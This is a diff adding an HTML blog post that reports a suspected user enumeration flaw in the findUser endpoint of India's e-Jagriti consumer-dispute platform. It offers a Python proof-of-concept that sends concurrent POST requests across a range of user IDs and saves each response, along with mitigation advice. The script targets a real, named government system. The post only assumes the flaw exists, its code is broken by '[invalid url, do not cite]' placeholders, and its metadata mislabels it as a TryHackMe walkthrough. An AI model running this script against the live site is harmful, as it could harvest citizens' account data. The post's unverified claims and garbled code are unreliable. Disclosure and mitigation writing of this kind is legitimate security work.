@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Exposing a User Enumeration Vulnerability in e-Jagriti’s findUser Endpoint | Classroom</title>
+
+    
+<link href="/img/avatar.jpeg" rel="shortcut icon" type="image/x-icon" />
+
+
+
+
+
+<meta name="author" content="Animesh Roy @anir0y  "  />
+<meta name="description" content="Try Hack Me Room ROOM_NAME solved by Animesh Roy. this is a walkthough. read more..." />
+
+
+
+<title>Animesh Roy | Classroom Posts</title>
+<meta name="title" content="Animesh Roy | Blogs & Writeups">
+<meta name="description" content="Animesh Roy has more than a decade worth experience working in cyber security domain. He has worked with governments, corporates, colleges and universities, defence, and the community. He also running a community “Arishti Live” to help everyone who wants to, or work in cyber security domain. His expertise on training & consulting are the best of both the world. He uses his real-life case studies in trainings, to help candidates to understand the job in better ways.">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SPD6BXK0P5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-SPD6BXK0P5');
+</script>
+
+
+
+<script type="text/javascript">
+  (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "it10lq8bk1");
+</script>
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://classroom.anir0y.in/">
+<meta property="og:title" content="Animesh Roy | Blogs & Writeups">
+<meta property="og:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
+<meta property="og:image" content="https://i.imgur.com/Ji5C41H.png">
+
+
+<script type="text/javascript" charset="UTF-8" src="//cdn.cookie-script.com/s/88cd00f83ae38d0239d06996b1ad293a.js"></script>
+
+
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:url" content="http://localhost:1313/post/tryhackme-bugbounty-1/">
+
+<meta property="twitter:title" content="Animesh Roy | Blogs & Writeups">
+<meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
+<meta property="twitter:image" content="https://i.imgur.com/Ji5C41H.png">
+
+
+
+
+
+
+
+<script data-ad-client="ca-pub-3526678290068011" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/post/tryhackme-bugbounty-1/" />
+
+
+<meta property="og:url" content="http://localhost:1313/post/tryhackme-bugbounty-1/">
+  <meta property="og:site_name" content="Classroom">
+  <meta property="og:title" content="Exposing a User Enumeration Vulnerability in e-Jagriti’s findUser Endpoint">
+  <meta property="og:description" content="Try Hack Me Room ROOM_NAME solved by Animesh Roy. this is a walkthough. read more...">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-07-14T02:24:47+05:30">
+    <meta property="article:modified_time" content="2025-07-14T02:24:47+05:30">
+    <meta property="article:tag" content="Owasp">
+    <meta property="article:tag" content="Idor">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Exposing a User Enumeration Vulnerability in e-Jagriti’s findUser Endpoint">
+  <meta name="twitter:description" content="Try Hack Me Room ROOM_NAME solved by Animesh Roy. this is a walkthough. read more...">
+
+
+<link rel="stylesheet" href="/css/semantic.min.css" />
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="/css/OverlayScrollbars.min.css" />
+<link rel="stylesheet" href="/css/github-markdown.css" />
+<link rel="stylesheet" href="/css/site.css" />
+<link rel="stylesheet" href="/css/custom.css" />
+
+<style>
+  a:not(.ui.button):hover {
+    text-decoration: underline;
+  }
+
+  
+  a:not(.ui.button) {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a:not(.ui.button),
+  .inverted a:not(.ui.button):hover {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: #fff;
+    
+
+    
+  }
+  
+
+  
+  body.dark {
+    
+    background-color: black;
+    
+
+    
+  }
+  
+</style>
+
+
+    
+
+
+
+<link rel="stylesheet" data-highlight href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css" />
+
+
+
+
+
+
+
+    
+    <link rel="stylesheet" href="/css/custom.css" />
+    
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary menu dream-menu">
+
+  <div class="item">
+    <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
+  </div>
+  <div class="item">
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'http:\/\/localhost:1313\/'"></i>
+  </div>
+  
+  <div class="item">
+    <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
+  </div>
+  
+  
+  <div class="item">
+    <i class="large link search icon" onclick="toggleSearch()"></i>
+  </div>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui relaxed grid dream-grid dream-grid-single"style="flex-direction: row-reverse;">
+  <aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside">
+    
+    
+    <div class="ui segment toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#understanding-user-enumeration">Understanding User Enumeration</a></li>
+    <li><a href="#the-vulnerability-in-e-jagriti">The Vulnerability in e-Jagriti</a></li>
+    <li><a href="#proof-of-concept">Proof of Concept</a></li>
+    <li><a href="#potential-impact">Potential Impact</a></li>
+    <li><a href="#mitigation-strategies">Mitigation Strategies</a></li>
+    <li><a href="#comparison-with-common-vulnerabilities">Comparison with Common Vulnerabilities</a></li>
+    <li><a href="#ethical-considerations">Ethical Considerations</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    </div>
+    
+    <div class="ui segment actions">
+      <button
+        class="ui circular icon button save-as-image"
+        title="Save as image"
+        onclick="savePostAsImg()">
+        <i class="save icon"></i>
+      </button>
+
+      <a href="https://twitter.com/intent/tweet?text=Exposing%20a%20User%20Enumeration%20Vulnerability%20in%20e-Jagriti%e2%80%99s%20findUser%20Endpoint&url=http%3a%2f%2flocalhost%3a1313%2fpost%2ftryhackme-bugbounty-1%2f" class="ui circular twitter icon button">
+  <i class="twitter icon"></i>
+</a>
+<a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fpost%2ftryhackme-bugbounty-1%2f" class="ui circular facebook icon button">
+  <i class="facebook icon"></i>
+</a>
+
+    </div>
+  </aside>
+  <div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    
+    <section class="ui top attached segment">
+      <header>
+        <h1 class="ui large header">Exposing a User Enumeration Vulnerability in e-Jagriti’s findUser Endpoint<div class="sub header">
+            @
+            
+              
+                <a href="https://bit.ly/34sGFiK" target="_blank">Animesh Roy</a>
+              
+            
+
+            | 
+                Monday, Jul 14, 2025
+              
+
+            | 7 minutes read
+
+            | Update at
+              
+                Monday, Jul 14, 2025
+              
+          </div>
+        </h1>
+      </header>
+
+      <article class="main"><!-- Google Ads -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<p><ins class="adsbygoogle"
+style="display:block; text-align:center;"
+data-ad-layout="in-article"
+data-ad-format="fluid"
+data-ad-client="ca-pub-3526678290068011"
+data-ad-slot="7160066188"></ins></p>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<!-- END -->
+<hr>
+<h2 id="introduction">Introduction</h2>
+<p>The e-Jagriti platform, developed by the Department of Consumer Affairs, Government of India, is a digital solution for consumer dispute resolution, offering features such as online case filing, real-time monitoring, and AI-powered search capabilities. Hosted at [e-jagriti.gov.in]([invalid url, do not cite]), it aims to enhance accessibility and efficiency in addressing consumer grievances. However, a potential security vulnerability in its <code>/services/user/auth/v2/findUser</code> endpoint may allow attackers to perform user enumeration, identifying valid user accounts by exploiting differences in server responses. This blog post examines the nature of this vulnerability, demonstrates a proof of concept (PoC), evaluates its potential impact, and proposes mitigation strategies to enhance the platform’s security.</p>
+<h2 id="understanding-user-enumeration">Understanding User Enumeration</h2>
+<p>User enumeration is a security vulnerability that enables an attacker to determine whether a specific username or user ID exists within a system. This is typically achieved by analyzing variations in server responses when querying different user identifiers. For example, a system might return user data or a specific error for an existing user, while providing a different error (e.g., “User not found”) for a non-existent user. According to resources like the <a href="https://www.rapid7.com/blog/post/2017/06/15/about-user-enumeration/">Rapid7 Blog</a>, this discrepancy allows attackers to compile a list of valid users, which can be used for subsequent attacks such as brute-force password attempts or targeted phishing campaigns. The <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account">OWASP Foundation</a> identifies user enumeration as a critical component of penetration testing due to its potential to expose sensitive account information.</p>
+<h2 id="the-vulnerability-in-e-jagriti">The Vulnerability in e-Jagriti</h2>
+<p>The <code>/services/user/auth/v2/findUser</code> endpoint in e-Jagriti is designed to retrieve user information based on a provided <code>userId</code> in a POST request. However, this endpoint may inadvertently facilitate user enumeration. By sending requests with various <code>userId</code> values, an attacker could potentially distinguish between existing and non-existent users based on the server’s response. For instance, a valid <code>userId</code> might return user data or a specific success message, while an invalid <code>userId</code> could trigger a “user not found” or similar error. This behavior, if present, aligns with the characteristics of user enumeration vulnerabilities described by <a href="https://www.virtuesecurity.com/kb/username-enumeration/">Virtue Security</a> and <a href="https://bluegoatcyber.com/blog/username-enumeration-vulnerability-explained/">Blue Goat Cyber</a>.</p>
+<p>The vulnerability was explored through a PoC that systematically queries the endpoint with a range of <code>userId</code> values, saving the responses for analysis. The ability to automate such queries using concurrent threads increases the efficiency of this process, making it feasible for an attacker to enumerate users at scale.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>The following Python script demonstrates how the vulnerability can be exploited by sending POST requests to the <code>/services/user/auth/v2/findUser</code> endpoint with a range of <code>userId</code> values. The script uses concurrent threads to process multiple requests efficiently and saves each response as a JSON file named after the corresponding <code>userId</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> concurrent.futures <span style="color:#f92672">import</span> ThreadPoolExecutor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define the request details</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[invalid url, do not cite]</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Host&#34;</span>: <span style="color:#e6db74">&#34;e-jagriti.gov.in&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Cookie&#34;</span>: <span style="color:#e6db74">&#34;XSRF-TOKEN=NDKDdfdsfkldsfNd3SZAJfwLsTl5WUgOkE&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Content-Length&#34;</span>: <span style="color:#e6db74">&#34;18&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sec-Ch-Ua-Platform&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">macOS</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Authorization&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;en-US,en;q=0.9&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sec-Ch-Ua&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Not)A;Brand</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;v=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">8</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">, </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Chromium</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;v=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">138</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sec-Ch-Ua-Mobile&#34;</span>: <span style="color:#e6db74">&#34;?0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;[invalid url, do not cite]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sec-Fetch-Site&#34;</span>: <span style="color:#e6db74">&#34;same-origin&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sec-Fetch-Mode&#34;</span>: <span style="color:#e6db74">&#34;cors&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sec-Fetch-Dest&#34;</span>: <span style="color:#e6db74">&#34;empty&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;[invalid url, do not cite]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate, br&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Priority&#34;</span>: <span style="color:#e6db74">&#34;u=1, i&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;keep-alive&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define the sequence of userIds (e.g., range from 10005 to 10010)</span>
+</span></span><span style="display:flex;"><span>user_id_range <span style="color:#f92672">=</span> range(<span style="color:#ae81ff">10005</span>, <span style="color:#ae81ff">10011</span>)  <span style="color:#75715e"># Adjust as needed</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Number of concurrent threads (adjust as needed)</span>
+</span></span><span style="display:flex;"><span>num_threads <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>  <span style="color:#75715e"># You can change this to control concurrency</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_request</span>(user_id: int) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Send a POST request for a given userId and save the response.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Update payload with current userId</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;userId&#34;</span>: user_id}
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Send the POST request</span>
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>headers, json<span style="color:#f92672">=</span>payload)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check if the response is successful</span>
+</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span>raise_for_status()
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Parse the response as JSON</span>
+</span></span><span style="display:flex;"><span>        response_json <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Save the response to a file named after userId</span>
+</span></span><span style="display:flex;"><span>        filename <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>user_id<span style="color:#e6db74">}</span><span style="color:#e6db74">.json&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(filename, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            json<span style="color:#f92672">.</span>dump(response_json, f, indent<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response for userId </span><span style="color:#e6db74">{</span>user_id<span style="color:#e6db74">}</span><span style="color:#e6db74"> saved to </span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error sending request for userId </span><span style="color:#e6db74">{</span>user_id<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">ValueError</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error parsing JSON response for userId </span><span style="color:#e6db74">{</span>user_id<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IOError</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error writing to file for userId </span><span style="color:#e6db74">{</span>user_id<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use ThreadPoolExecutor to send requests concurrently</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> ThreadPoolExecutor(max_workers<span style="color:#f92672">=</span>num_threads) <span style="color:#66d9ef">as</span> executor:
+</span></span><span style="display:flex;"><span>    executor<span style="color:#f92672">.</span>map(send_request, user_id_range)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;All requests completed.&#34;</span>)
+</span></span></code></pre></div><p>This script can be adapted to query a larger range of <code>userId</code> values or a specific list of IDs. By examining the saved JSON files, an attacker could identify valid <code>userId</code> values based on differences in the response content, such as the presence of user data versus error messages.</p>
+<h2 id="potential-impact">Potential Impact</h2>
+<p>The user enumeration vulnerability in e-Jagriti could have significant consequences, depending on the nature of the data returned and the platform’s security measures. Potential impacts include:</p>
+<ul>
+<li><strong>Targeted Brute-Force Attacks</strong>: As noted by <a href="https://www.upguard.com/blog/what-is-an-enumeration-attack">UpGuard</a>, a list of valid user IDs enables attackers to focus brute-force password attacks on confirmed accounts, increasing the likelihood of unauthorized access.</li>
+<li><strong>Phishing and Social Engineering</strong>: Valid user IDs can be used to craft targeted phishing campaigns, as highlighted by <a href="https://www.linkedin.com/pulse/understanding-preventing-user-enumeration-donny-widjaja-mspm-cspo">LinkedIn</a>, making attacks more convincing and effective.</li>
+<li><strong>Data Breaches</strong>: If the endpoint returns sensitive user information, such as personal details, it could lead to data breaches, compromising user privacy and violating regulations like India’s Personal Data Protection Bill.</li>
+<li><strong>Reputation and Compliance Risks</strong>: A confirmed vulnerability could undermine public trust in e-Jagriti and lead to non-compliance with data protection standards, as outlined by <a href="https://www.thesmartscanner.com/vulnerability-list/user-enumeration">SmartScanner</a>.</li>
+</ul>
+<p>The exact impact depends on the endpoint’s response behavior and the sensitivity of the data returned, which requires further investigation to fully assess.</p>
+<h2 id="mitigation-strategies">Mitigation Strategies</h2>
+<p>To address this potential vulnerability, the following measures are recommended, based on best practices from sources like <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account">OWASP</a> and <a href="https://www.techtarget.com/searchsecurity/tip/What-enumeration-attacks-are-and-how-to-prevent-them">TechTarget</a>:</p>
+<ol>
+<li><strong>Consistent Error Messages</strong>: Configure the endpoint to return identical error messages for both valid and invalid <code>userId</code> values (e.g., “Invalid request”) to prevent attackers from distinguishing between them.</li>
+<li><strong>Rate Limiting</strong>: Implement rate limiting to restrict the number of requests an attacker can make in a short period, reducing the feasibility of large-scale enumeration.</li>
+<li><strong>Authentication Requirements</strong>: Require authentication (e.g., a valid session token) before allowing access to user information, ensuring only authorized users can query the endpoint.</li>
+<li><strong>Monitoring and Logging</strong>: Deploy monitoring systems to detect and alert on suspicious patterns, such as repeated requests with sequential <code>userId</code> values.</li>
+<li><strong>Regular Security Audits</strong>: Conduct periodic security audits and penetration testing to identify and address vulnerabilities proactively.</li>
+</ol>
+<h2 id="comparison-with-common-vulnerabilities">Comparison with Common Vulnerabilities</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Vulnerability Type</th>
+          <th>e-Jagriti User Enumeration</th>
+          <th>Typical Login Page Enumeration</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Attack Vector</strong></td>
+          <td>POST requests to <code>/findUser</code> endpoint</td>
+          <td>Login or password reset forms</td>
+      </tr>
+      <tr>
+          <td><strong>Response Difference</strong></td>
+          <td>User data vs. error message (assumed)</td>
+          <td>“Invalid username” vs. “Invalid password”</td>
+      </tr>
+      <tr>
+          <td><strong>Impact</strong></td>
+          <td>Enables targeted attacks, potential data leak</td>
+          <td>Enables targeted attacks</td>
+      </tr>
+      <tr>
+          <td><strong>Mitigation</strong></td>
+          <td>Consistent errors, rate limiting</td>
+          <td>Generic error messages, CAPTCHA</td>
+      </tr>
+  </tbody>
+</table>
+<p>This table illustrates how e-Jagriti’s vulnerability aligns with common user enumeration issues but is specific to its API endpoint design.</p>
+<h2 id="ethical-considerations">Ethical Considerations</h2>
+<p>Exposing vulnerabilities like this one is intended to promote awareness and encourage secure development practices. However, testing or exploiting such vulnerabilities without explicit permission is illegal and unethical. The PoC provided here is for educational purposes only, and any security testing should be conducted in accordance with legal and ethical guidelines, such as obtaining authorization from the platform’s administrators.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>The potential user enumeration vulnerability in e-Jagriti’s <code>/services/user/auth/v2/findUser</code> endpoint highlights the critical need for robust security measures in digital governance platforms. By allowing attackers to identify valid user IDs, this vulnerability could facilitate targeted attacks and compromise user trust. Implementing consistent error messages, rate limiting, and authentication requirements can mitigate this risk. This disclosure aims to foster dialogue on improving the security of e-Jagriti, ensuring it remains a reliable and secure platform for consumer dispute resolution.</p>
+<p><strong>Citations</strong>:</p>
+<ul>
+<li><a href="https://www.rapid7.com/blog/post/2017/06/15/about-user-enumeration/">Rapid7 Blog: User Enumeration Explained</a></li>
+<li><a href="https://medium.com/@leilaalvess/what-is-user-enumeration-c7d5a56eeba0">Medium: What is User Enumeration?</a></li>
+<li><a href="https://www.upguard.com/blog/what-is-an-enumeration-attack">UpGuard: What is an Enumeration Attack?</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/203.html">CWE: Observable Discrepancy (CWE-203)</a></li>
+<li><a href="https://www.virtuesecurity.com/kb/username-enumeration/">Virtue Security: Username Enumeration</a></li>
+<li><a href="https://www.thesmartscanner.com/vulnerability-list/user-enumeration">SmartScanner: User Enumeration</a></li>
+<li><a href="https://www.techtarget.com/searchsecurity/tip/What-enumeration-attacks-are-and-how-to-prevent-them">TechTarget: Enumeration Attacks</a></li>
+<li><a href="https://bluegoatcyber.com/blog/username-enumeration-vulnerability-explained/">Blue Goat Cyber: Username Enumeration Vulnerability Explained</a></li>
+<li><a href="https://www.linkedin.com/pulse/understanding-preventing-user-enumeration-donny-widjaja-mspm-cspo">LinkedIn: Understanding and Preventing User Enumeration Vulnerability</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account">OWASP: Testing for Account Enumeration and Guessable User Account</a></li>
+</ul>
+<hr>
+<!-- Google Ads -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<p><ins class="adsbygoogle"
+style="display:block; text-align:center;"
+data-ad-layout="in-article"
+data-ad-format="fluid"
+data-ad-client="ca-pub-3526678290068011"
+data-ad-slot="7160066188"></ins></p>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<!-- END -->
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+<!-- EOF -->
+</article>
+    </section>
+
+    
+
+    
+
+    
+  </div>
+</div>
+
+
+            <footer class="ui basic center aligned segment" style="background-color: transparent;">
+              
+              <p>© 2010 - 2025 Classroom</p>
+              
+
+              
+
+              
+            </footer>
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <header class="ui basic very padded segment dream-header">
+  <div class="ui small circular image">
+    
+    <img src="/img/avatar.jpeg" />
+    
+  </div>
+
+  <div class="content">
+    <h1 class="ui medium header">Reading Stuffs<div class="sub header"></div>
+    </h1>
+
+    <article class="ui horizontal list">
+      
+      <a class="item" href="/categories">
+        <i class="th list icon" title="All Categories"></i>
+      </a>
+      <a class="item" href="/tags">
+        <i class="tags icon" title="All Tags"></i>
+      </a>
+    </article>
+
+  </div>
+</header>
+
+
+<div class="ui relaxed grid dream-grid dream-back">
+  
+  
+  
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment">
+      <h3 class="ui header">Social Links</h3>
+      <nav class="ui secondary menu dream-menu dream-socials">
+  
+  <div class="item">
+    <a href="/index.xml">
+      <i class="large rss square icon" title="RSS"></i>
+    </a>
+  </div>
+  
+
+  
+  <div class="item">
+    <a href="mailto:classroom@anir0y.in">
+      <i class="large mail icon" title="Email"></i>
+    </a>
+  </div>
+  
+
+  
+  <div class="item">
+    <a href="https://twitter.com/anir0y" target="_blank">
+      <i class="large twitter icon" title="Twitter"></i>
+    </a>
+  </div>
+  
+
+  
+  <div class="item">
+    <a href="https://facebook.com/0xanir0y" target="_blank">
+      <i class="large facebook icon" title="Facebook"></i>
+    </a>
+  </div>
+  
+
+  
+  <div class="item">
+    <a href="https://instagram.com/0xanir0y" target="_blank">
+      <i class="large instagram icon" title="Instagram"></i>
+    </a>
+  </div>
+  
+
+  
+
+  
+  <div class="item">
+    <a href="https://www.linkedin.com/in/anir0y" target="_blank">
+      <i class="large linkedin icon" title="Linkedin"></i>
+    </a>
+  </div>
+  
+
+  
+  <div class="item">
+    <a href="https://github.com/anir0y" target="_blank">
+      <i class="large github icon" title="GitHub"></i>
+    </a>
+  </div>
+  
+
+  
+
+  
+</nav>
+
+    </article>
+  </div>
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+    <article class="ui segment">
+      YOU CAN REUSE MY CONTENT
+    </article>
+    
+  </div>
+
+  
+  
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script>
+  window.defaultDark =  null 
+  window.backgroundDark = "black"
+  window.backgroundImageDark =  null 
+  window.darkNav =  true 
+  window.hasTwitterEmbed =  true 
+
+  if (window.hasTwitterEmbed) {
+    
